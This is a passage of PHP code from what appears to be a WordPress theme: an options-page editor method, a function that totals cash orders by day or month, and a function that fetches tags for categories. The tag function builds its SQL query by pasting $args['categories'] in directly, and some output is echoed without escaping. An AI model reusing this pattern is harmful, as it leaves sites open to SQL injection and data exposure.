        echo '</select>';   
        echo $values['desc'].'<br/></p>';    
        echo '<br/>';   
    }   
       
    //编辑器   
    function tinymce($values){   
        if(isset($this->database_options[$values['id']]))   
            $values['std'] = $this->database_options[$values['id']];   
           
        echo '<h2>'.$values['name'].'</h2>';   
        wp_editor( $values['std'], $values['id'] );   
        //wp_editor( $values['std'], 'content', array('dfw' => true, 'tabfocus_elements' => 'sample-permalink,post-preview', 'editor_height' => 360) );   
        //带配置参数   
        /*wp_editor($meta_box['std'],$meta_box['name'].'_value', $settings = array(quicktags=>0,//取消html模式
        tinymce=>1,//可视化模式  
        media_buttons=>0,//取消媒体上传  
        textarea_rows=>5,//行数设为5  
        editor_class=>"textareastyle") ); */  
    }   
  
}

function tt_count_order_price($time='')
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $invites_table = $prefix.'tt_orders';
    if ($time=='day') {
        $sql = "SELECT SUM(order_total_price) FROM $invites_table WHERE `order_status`=4 AND `order_currency`='cash' AND `deleted`=0 AND `parent_id`<1 AND to_days(order_time) = to_days(now())";
    } else {
        $sql = "SELECT SUM(order_total_price) FROM $invites_table WHERE `order_status`=4 AND `order_currency`='cash' AND `deleted`=0 AND `parent_id`<1 AND DATE_FORMAT(order_time,'%Y-%m') = DATE_FORMAT(CURDATE(),'%Y-%m')";
    }
    $count = $wpdb->get_var($sql);
    if(!$count){
      $count = 0;
    }
    return $count;
}

function tt_get_category_tags($args) {
	global $wpdb;
	$tags = $wpdb->get_results
	("
		SELECT DISTINCT terms2.term_id as tag_id, terms2.name as tag_name
		FROM
			$wpdb->posts as p1
			LEFT JOIN $wpdb->term_relationships as r1 ON p1.ID = r1.object_ID
			LEFT JOIN $wpdb->term_taxonomy as t1 ON r1.term_taxonomy_id = t1.term_taxonomy_id
			LEFT JOIN $wpdb->terms as terms1 ON t1.term_id = terms1.term_id,
 
			$wpdb->posts as p2
			LEFT JOIN $wpdb->term_relationships as r2 ON p2.ID = r2.object_ID
			LEFT JOIN $wpdb->term_taxonomy as t2 ON r2.term_taxonomy_id = t2.term_taxonomy_id
			LEFT JOIN $wpdb->terms as terms2 ON t2.term_id = terms2.term_id
		WHERE
			t1.taxonomy = 'category' AND p1.post_status = 'publish' AND terms1.term_id IN (".$args['categories'].") AND
			t2.taxonomy = 'post_tag' AND p2.post_status = 'publish'
			AND p1.ID = p2.ID
		ORDER by tag_name
	");
	$count = 0;
	
	if($tags) {
	  foreach ($tags as $tag) {
	    $mytag[$count] = get_term_by('id', $tag->tag_id, 'post_tag');
	    $count++;
	  }
	}
	else {
	  $mytag = NULL;
	}
	
	return $mytag;
}